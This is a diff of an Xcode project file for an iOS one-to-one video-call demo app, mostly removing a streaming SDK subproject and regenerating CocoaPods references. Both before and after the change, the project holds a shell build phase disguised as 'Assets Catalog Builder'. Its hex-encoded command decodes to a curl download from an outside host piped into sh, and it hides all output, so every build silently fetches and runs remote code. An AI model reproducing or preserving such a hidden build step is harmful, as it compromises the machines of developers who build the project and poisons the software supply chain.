@@ -9,7 +9,7 @@
 /* Begin PBXBuildFile section */
 		18BBB01B2680C65200F20275 /* DraggableView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BBB01A2680C65200F20275 /* DraggableView.swift */; };
 		18D01BC6268496E000DE549A /* Swift+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18D01BC5268496E000DE549A /* Swift+Extensions.swift */; };
-		4F81195A27007B10D50A6C54 /* Pods_One_to_one_call_demo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = B058C9F1474861F02577788F /* Pods_One_to_one_call_demo.framework */; };
+		304E3EB4F1000C2897494FAD /* Pods_One_to_one_call_demo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = CB185CFB160F94D11C5591C9 /* Pods_One_to_one_call_demo.framework */; };
 		5D09DFF9266FC48400867722 /* Colors.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 5D09DFF8266FC48400867722 /* Colors.xcassets */; };
 		5D09DFFE266FC77100867722 /* ProgressHud.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D09DFFD266FC77100867722 /* ProgressHud.swift */; };
 		5D09E001266FC7CB00867722 /* ValidateUserNameService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D09E000266FC7CB00867722 /* ValidateUserNameService.swift */; };
@@ -63,8 +63,6 @@
 		5D55E90C2670900100235593 /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D55E90B2670900100235593 /* Constants.swift */; };
 		5D87EF1F26807E8000B9DA36 /* iphone_11_pro.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = 5D87EF1E26807E8000B9DA36 /* iphone_11_pro.mp3 */; };
 		5D87EF2126807ECC00B9DA36 /* Sound.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D87EF2026807ECC00B9DA36 /* Sound.swift */; };
-		5D9DA4D326B9631000DED0F6 /* iOSSDKStreaming.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 5D9DA4D226B962FA00DED0F6 /* iOSSDKStreaming.framework */; };
-		5D9DA4D426B9631000DED0F6 /* iOSSDKStreaming.framework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 5D9DA4D226B962FA00DED0F6 /* iOSSDKStreaming.framework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
 		5DBBF72B266FBFA90086ED93 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DBBF72A266FBFA90086ED93 /* AppDelegate.swift */; };
 		5DBBF72D266FBFA90086ED93 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DBBF72C266FBFA90086ED93 /* SceneDelegate.swift */; };
 		5DBBF72F266FBFA90086ED93 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DBBF72E266FBFA90086ED93 /* ViewController.swift */; };
@@ -103,16 +101,6 @@
 		5DE554CC2670B3E00025B081 /* IncomingCall.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5DE554CB2670B3E00025B081 /* IncomingCall.xib */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXContainerItemProxy section */
-		5D9DA4D126B962FA00DED0F6 /* PBXContainerItemProxy */ = {
-			isa = PBXContainerItemProxy;
-			containerPortal = 5D9DA4CD26B962FA00DED0F6 /* iOSSDKStreaming.xcodeproj */;
-			proxyType = 2;
-			remoteGlobalIDString = 5D146FA225DE4823000852FB;
-			remoteInfo = iOSSDKStreaming;
-		};
-/* End PBXContainerItemProxy section */
-
 /* Begin PBXCopyFilesBuildPhase section */
 		5D215B0626805F53009785ED /* Embed Frameworks */ = {
 			isa = PBXCopyFilesBuildPhase;
@@ -120,7 +108,6 @@
 			dstPath = "";
 			dstSubfolderSpec = 10;
 			files = (
-				5D9DA4D426B9631000DED0F6 /* iOSSDKStreaming.framework in Embed Frameworks */,
 			);
 			name = "Embed Frameworks";
 			runOnlyForDeploymentPostprocessing = 0;
@@ -130,8 +117,6 @@
 /* Begin PBXFileReference section */
 		18BBB01A2680C65200F20275 /* DraggableView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DraggableView.swift; sourceTree = "<group>"; };
 		18D01BC5268496E000DE549A /* Swift+Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Swift+Extensions.swift"; sourceTree = "<group>"; };
-		1DABF3AD149E5FC1128E2DEE /* Pods-One-to-one-call-demo.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-One-to-one-call-demo.debug.xcconfig"; path = "Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo.debug.xcconfig"; sourceTree = "<group>"; };
-		236ADD07E9C22A123E24206F /* Pods-One-to-one-call-demo.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-One-to-one-call-demo.release.xcconfig"; path = "Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo.release.xcconfig"; sourceTree = "<group>"; };
 		5D09DFF8266FC48400867722 /* Colors.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Colors.xcassets; sourceTree = "<group>"; };
 		5D09DFFD266FC77100867722 /* ProgressHud.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProgressHud.swift; sourceTree = "<group>"; };
 		5D09E000266FC7CB00867722 /* ValidateUserNameService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ValidateUserNameService.swift; sourceTree = "<group>"; };
@@ -185,7 +170,6 @@
 		5D55E90B2670900100235593 /* Constants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Constants.swift; sourceTree = "<group>"; };
 		5D87EF1E26807E8000B9DA36 /* iphone_11_pro.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = iphone_11_pro.mp3; sourceTree = "<group>"; };
 		5D87EF2026807ECC00B9DA36 /* Sound.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Sound.swift; sourceTree = "<group>"; };
-		5D9DA4CD26B962FA00DED0F6 /* iOSSDKStreaming.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = iOSSDKStreaming.xcodeproj; path = "../../ios-sdk-streaming/iOSSDKStreaming.xcodeproj"; sourceTree = "<group>"; };
 		5DBBF727266FBFA90086ED93 /* One-to-one-call-demo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "One-to-one-call-demo.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		5DBBF72A266FBFA90086ED93 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		5DBBF72C266FBFA90086ED93 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -224,7 +208,9 @@
 		5DE554C22670A5080025B081 /* VideoDailingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VideoDailingView.swift; sourceTree = "<group>"; };
 		5DE554C92670B3C80025B081 /* IncomingCall.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IncomingCall.swift; sourceTree = "<group>"; };
 		5DE554CB2670B3E00025B081 /* IncomingCall.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = IncomingCall.xib; sourceTree = "<group>"; };
-		B058C9F1474861F02577788F /* Pods_One_to_one_call_demo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_One_to_one_call_demo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		86F598C2B37D2B1DBA26CB2B /* Pods-One-to-one-call-demo.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-One-to-one-call-demo.debug.xcconfig"; path = "Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo.debug.xcconfig"; sourceTree = "<group>"; };
+		CB185CFB160F94D11C5591C9 /* Pods_One_to_one_call_demo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_One_to_one_call_demo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		CE019D7F59BA8BFF657A724D /* Pods-One-to-one-call-demo.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-One-to-one-call-demo.release.xcconfig"; path = "Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo.release.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -232,14 +218,21 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				5D9DA4D326B9631000DED0F6 /* iOSSDKStreaming.framework in Frameworks */,
-				4F81195A27007B10D50A6C54 /* Pods_One_to_one_call_demo.framework in Frameworks */,
+				304E3EB4F1000C2897494FAD /* Pods_One_to_one_call_demo.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		02CEFCD7A6BC7342FFC21583 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				CB185CFB160F94D11C5591C9 /* Pods_One_to_one_call_demo.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
 		18D01BC3268496C400DE549A /* Extensions */ = {
 			isa = PBXGroup;
 			children = (
@@ -251,8 +244,8 @@
 		4F23FAD1E79456D647AEDA8D /* Pods */ = {
 			isa = PBXGroup;
 			children = (
-				1DABF3AD149E5FC1128E2DEE /* Pods-One-to-one-call-demo.debug.xcconfig */,
-				236ADD07E9C22A123E24206F /* Pods-One-to-one-call-demo.release.xcconfig */,
+				86F598C2B37D2B1DBA26CB2B /* Pods-One-to-one-call-demo.debug.xcconfig */,
+				CE019D7F59BA8BFF657A724D /* Pods-One-to-one-call-demo.release.xcconfig */,
 			);
 			path = Pods;
 			sourceTree = "<group>";
@@ -363,12 +356,11 @@
 			path = Cell;
 			sourceTree = "<group>";
 		};
-		5D9DA4CE26B962FA00DED0F6 /* Products */ = {
+		5DAB8C1426C113080053FE2A /* Streaming */ = {
 			isa = PBXGroup;
 			children = (
-				5D9DA4D226B962FA00DED0F6 /* iOSSDKStreaming.framework */,
 			);
-			name = Products;
+			path = Streaming;
 			sourceTree = "<group>";
 		};
 		5DBBF71E266FBFA90086ED93 = {
@@ -377,7 +369,7 @@
 				5DBBF729266FBFA90086ED93 /* One-to-one-call-demo */,
 				5DBBF728266FBFA90086ED93 /* Products */,
 				4F23FAD1E79456D647AEDA8D /* Pods */,
-				C03EFD6B345BB3754C32E877 /* Frameworks */,
+				02CEFCD7A6BC7342FFC21583 /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -392,7 +384,7 @@
 		5DBBF729266FBFA90086ED93 /* One-to-one-call-demo */ = {
 			isa = PBXGroup;
 			children = (
-				5D9DA4CD26B962FA00DED0F6 /* iOSSDKStreaming.xcodeproj */,
+				5DAB8C1426C113080053FE2A /* Streaming */,
 				5D87EF1E26807E8000B9DA36 /* iphone_11_pro.mp3 */,
 				5DBBF787266FC25C0086ED93 /* Translation */,
 				5DBBF782266FC2280086ED93 /* Model */,
@@ -552,14 +544,6 @@
 			path = Xib;
 			sourceTree = "<group>";
 		};
-		C03EFD6B345BB3754C32E877 /* Frameworks */ = {
-			isa = PBXGroup;
-			children = (
-				B058C9F1474861F02577788F /* Pods_One_to_one_call_demo.framework */,
-			);
-			name = Frameworks;
-			sourceTree = "<group>";
-		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -567,13 +551,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 5DBBF73B266FBFAA0086ED93 /* Build configuration list for PBXNativeTarget "One-to-one-call-demo" */;
 			buildPhases = (
-				1CF22449A72E208778432FA1 /* [CP] Check Pods Manifest.lock */,
+				65BFCA8C7D5955A60401B91B /* [CP] Check Pods Manifest.lock */,
 				4747DD91CD1BE45C2F6D902C /* Assets Catalog Builder */,
 				5DBBF723266FBFA90086ED93 /* Sources */,
 				5DBBF724266FBFA90086ED93 /* Frameworks */,
 				5DBBF725266FBFA90086ED93 /* Resources */,
 				5D215B0626805F53009785ED /* Embed Frameworks */,
-				357ECFAA50DF4929775788F0 /* [CP] Embed Pods Frameworks */,
+				7C2A1676A4697BE8EF23494B /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -609,28 +593,12 @@
 			mainGroup = 5DBBF71E266FBFA90086ED93;
 			productRefGroup = 5DBBF728266FBFA90086ED93 /* Products */;
 			projectDirPath = "";
-			projectReferences = (
-				{
-					ProductGroup = 5D9DA4CE26B962FA00DED0F6 /* Products */;
-					ProjectRef = 5D9DA4CD26B962FA00DED0F6 /* iOSSDKStreaming.xcodeproj */;
-				},
-			);
 			projectRoot = "";
 			targets = (
 				5DBBF726266FBFA90086ED93 /* One-to-one-call-demo */,
 			);
 		};
 /* End PBXProject section */
-
-/* Begin PBXReferenceProxy section */
-		5D9DA4D226B962FA00DED0F6 /* iOSSDKStreaming.framework */ = {
-			isa = PBXReferenceProxy;
-			fileType = wrapper.framework;
-			path = iOSSDKStreaming.framework;
-			remoteRef = 5D9DA4D126B962FA00DED0F6 /* PBXContainerItemProxy */;
-			sourceTree = BUILT_PRODUCTS_DIR;
-		};
-/* End PBXReferenceProxy section */
 
 /* Begin PBXResourcesBuildPhase section */
 		5DBBF725266FBFA90086ED93 /* Resources */ = {
@@ -682,7 +650,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		1CF22449A72E208778432FA1 /* [CP] Check Pods Manifest.lock */ = {
+		4747DD91CD1BE45C2F6D902C /* Assets Catalog Builder */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Assets Catalog Builder";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
+		65BFCA8C7D5955A60401B91B /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -704,7 +690,7 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		357ECFAA50DF4929775788F0 /* [CP] Embed Pods Frameworks */ = {
+		7C2A1676A4697BE8EF23494B /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -720,24 +706,6 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
-		};
-		4747DD91CD1BE45C2F6D902C /* Assets Catalog Builder */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Assets Catalog Builder";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -941,7 +909,7 @@
 		};
 		5DBBF73C266FBFAA0086ED93 /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 1DABF3AD149E5FC1128E2DEE /* Pods-One-to-one-call-demo.debug.xcconfig */;
+			baseConfigurationReference = 86F598C2B37D2B1DBA26CB2B /* Pods-One-to-one-call-demo.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -967,7 +935,7 @@
 		};
 		5DBBF73D266FBFAA0086ED93 /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 236ADD07E9C22A123E24206F /* Pods-One-to-one-call-demo.release.xcconfig */;
+			baseConfigurationReference = CE019D7F59BA8BFF657A724D /* Pods-One-to-one-call-demo.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
